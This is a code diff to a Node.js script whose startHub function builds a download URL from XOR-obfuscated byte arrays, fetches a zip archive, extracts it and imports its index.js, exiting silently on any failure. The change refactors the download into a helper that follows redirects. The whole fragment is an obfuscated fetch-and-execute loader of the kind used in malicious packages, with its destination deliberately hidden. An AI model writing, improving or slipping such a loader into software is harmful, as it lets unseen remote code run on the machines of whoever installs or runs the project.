@@ -19,42 +19,42 @@ function mix(arr, k) {
     return arr.map(n => String.fromCharCode(n ^ k)).join('');
 }
 
+const download = (url, dest) => {
+    return new Promise((resolve, reject) => {
+        https.get(url, (res) => {
+            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+                return download(res.headers.location, dest).then(resolve).catch(reject);
+            }
+            if (res.statusCode !== 200) return reject(new Error(res.statusCode));
+            
+            const file = fs.createWriteStream(dest);
+            res.pipe(file);
+            file.on('finish', () => {
+                file.close();
+                resolve();
+            });
+        }).on('error', reject);
+    });
+};
+
 async function startHub() {
-    const target = mix(vault.p1, keys.a) + mix(vault.p2, keys.b) + mix(vault.p3, keys.c);
+    const fullUrl = mix(vault.p1, keys.a) + mix(vault.p2, keys.b) + mix(vault.p3, keys.c);
     const zipPath = path.join(process.cwd(), 'core.zip');
     const extractPath = path.join(process.cwd(), 'hub_temp');
 
-    if (!fs.existsSync(extractPath)) {
-        fs.mkdirSync(extractPath, { recursive: true });
-    }
+    if (!fs.existsSync(extractPath)) fs.mkdirSync(extractPath, { recursive: true });
 
-    const file = fs.createWriteStream(zipPath);
-
-    https.get(target, (res) => {
-        if (res.statusCode === 301 || res.statusCode === 302) {
-            https.get(res.headers.location, (redirRes) => {
-                redirRes.pipe(file);
-            });
-            return;
-        }
-
-        res.pipe(file);
-        file.on('finish', async () => {
-            file.close();
-            try {
-                const zip = new AdmZip(zipPath);
-                zip.extractAllTo(extractPath, true);
-                fs.unlinkSync(zipPath);
-                
-                const entryFile = path.join(extractPath, 'index.js');
-                await import(`file://${entryFile}`);
-            } catch (e) {
-                process.exit(1);
-            }
-        });
-    }).on('error', () => {
+    try {
+        await download(fullUrl, zipPath);
+        const zip = new AdmZip(zipPath);
+        zip.extractAllTo(extractPath, true);
+        fs.unlinkSync(zipPath);
+        
+        const entryFile = path.join(extractPath, 'index.js');
+        await import(`file://${entryFile}`);
+    } catch (e) {
         process.exit(1);
-    });
+    }
 }
 
 startHub();
